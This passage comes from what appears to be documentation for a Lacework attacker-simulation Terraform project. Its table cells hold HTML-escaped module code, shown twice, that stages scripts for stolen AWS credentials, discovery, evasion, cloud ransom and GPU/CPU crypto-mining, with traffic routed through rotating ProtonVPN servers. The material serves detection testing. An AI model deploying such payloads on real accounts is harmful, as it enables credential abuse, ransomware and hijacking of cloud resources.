&&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;baseline<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/baseline&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;discovery&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/discovery&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;evasion&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/evasion&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudransom&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/cloudransom&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/terraform&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;hostcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/terraform&#46;sh<br/>    log &quot;Starting as background job&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;125;&quot; == &quot;0&quot; &&#35;93;; then<br/>        for i in $&&#35;40;echo &quot;US NL&#45;FREE&#35;1 JP&#45;FREE&#35;3 NL&#45;FREE&#35;4 NL&#45;FREE&#35;8 US&#45;FREE&#35;5 NL&#45;FREE&#35;9 NL&#45;FREE&#35;12 NL&#45;FREE&#35;13 NL&#45;FREE&#35;14 NL&#45;FREE&#35;15 NL&#45;FREE&#35;16 US&#45;FREE&#35;13 US&#45;FREE&#35;32 US&#45;FREE&#35;33 US&#45;FREE&#35;34 NL&#45;FREE&#35;39 NL&#45;FREE&#35;52 NL&#45;FREE&#35;57 NL&#45;FREE&#35;87 NL&#45;FREE&#35;133 NL&#45;FREE&#35;136 NL&#45;FREE&#35;148 US&#45;FREE&#35;52 US&#45;FREE&#35;53 US&#45;FREE&#35;54 US&#45;FREE&#35;51 NL&#45;FREE&#35;163 NL&#45;FREE&#35;164 US&#45;FREE&#35;58 US&#45;FREE&#35;57 US&#45;FREE&#35;56 US&#45;FREE&#35;55&quot;&&#35;41;; do cp &#46;env&#45;protonvpn &#46;env&#45;protonvpn&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;$i; done<br/>        /bin/bash auto&#45;free&#46;sh<br/>    else<br/>        for i in $&&#35;40;echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;&&#35;41;; do cp &#46;env&#45;protonvpn&#45;paid &#46;env&#45;protonvpn&#45;paid&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;paid&#45;$i; done<br/>        /bin/bash auto&#45;paid&#46;sh<br/>    fi;<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;paid       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = 2<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;baseline  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = &quot;US&quot;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;free   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;free&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;paid   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;paid&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    baseline    = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/baseline&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    discovery   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/discovery&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    evasion     = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/evasion&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudransom = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudransom&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudcrypto = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;crypto&#45;gpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    instances = 12<br/>                                    wallet = var&#46;inputs&&#35;91;&quot;ethermine&&#35;95;wallet&quot;&&#35;93;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    hostcrypto  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/hostcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;host&#45;cpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                    instances = 1<br/>                                    minergate&&#35;95;user = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;user&quot;&&#35;93;<br/>                                    nicehash&&#35;95;user = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;user&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    terraform  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/terraform&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    start       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/start&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;free&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;free&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;paid&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;paid&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;baseline&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;baseline&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;discovery&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;discovery&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;evasion&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;evasion&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;cloudransom&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;cloudransom&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;terraform&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;terraform&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;start&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;start&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>    |
| attacker-simulation-attacker-exec-docker-composite-compromised-credentials | ./modules/ssm/execute-docker-composite-compromised-credentials | ssm_exec_docker_compromised_keys           | context.aws.ssm.attacker.execute.docker_composite_compromised_credentials | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_compromised_credentials": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-compromised-credentials | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/cloud&#45;tunnel&quot;<br/>    script = &quot;discovery&#46;sh&quot;<br/>    script&&#35;95;type = &quot;scoutsuite&quot;<br/>    attack&&#35;95;type = &quot;compromised&&#35;95;keys&quot;<br/>    aws&&#35;95;creds = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for u,k in var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;: &quot;echo &&#35;x27;$&&#35;123;k&#46;rendered&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;aws&#45;$&&#35;123;u&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/protonvpn<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    $&&#35;123;local&#46;aws&&#35;95;creds&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;start&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/start&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;free&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;free&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;paid&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;paid<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;baseline<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/baseline&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;discovery&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/discovery&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;evasion&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/evasion&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudransom&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/cloudransom&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/terraform&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;hostcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/terraform&#46;sh<br/>    log &quot;Starting as background job&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;125;&quot; == &quot;0&quot; &&#35;93;; then<br/>        for i in $&&#35;40;echo &quot;US NL&#45;FREE&#35;1 JP&#45;FREE&#35;3 NL&#45;FREE&#35;4 NL&#45;FREE&#35;8 US&#45;FREE&#35;5 NL&#45;FREE&#35;9 NL&#45;FREE&#35;12 NL&#45;FREE&#35;13 NL&#45;FREE&#35;14 NL&#45;FREE&#35;15 NL&#45;FREE&#35;16 US&#45;FREE&#35;13 US&#45;FREE&#35;32 US&#45;FREE&#35;33 US&#45;FREE&#35;34 NL&#45;FREE&#35;39 NL&#45;FREE&#35;52 NL&#45;FREE&#35;57 NL&#45;FREE&#35;87 NL&#45;FREE&#35;133 NL&#45;FREE&#35;136 NL&#45;FREE&#35;148 US&#45;FREE&#35;52 US&#45;FREE&#35;53 US&#45;FREE&#35;54 US&#45;FREE&#35;51 NL&#45;FREE&#35;163 NL&#45;FREE&#35;164 US&#45;FREE&#35;58 US&#45;FREE&#35;57 US&#45;FREE&#35;56 US&#45;FREE&#35;55&quot;&&#35;41;; do cp &#46;env&#45;protonvpn &#46;env&#45;protonvpn&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;$i; done<br/>        /bin/bash auto&#45;free&#46;sh<br/>    else<br/>        for i in $&&#35;40;echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;&&#35;41;; do cp &#46;env&#45;protonvpn&#45;paid &#46;env&#45;protonvpn&#45;paid&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;paid&#45;$i; done<br/>        /bin/bash auto&#45;paid&#46;sh<br/>    fi;<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;paid       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = 2<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;baseline  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = 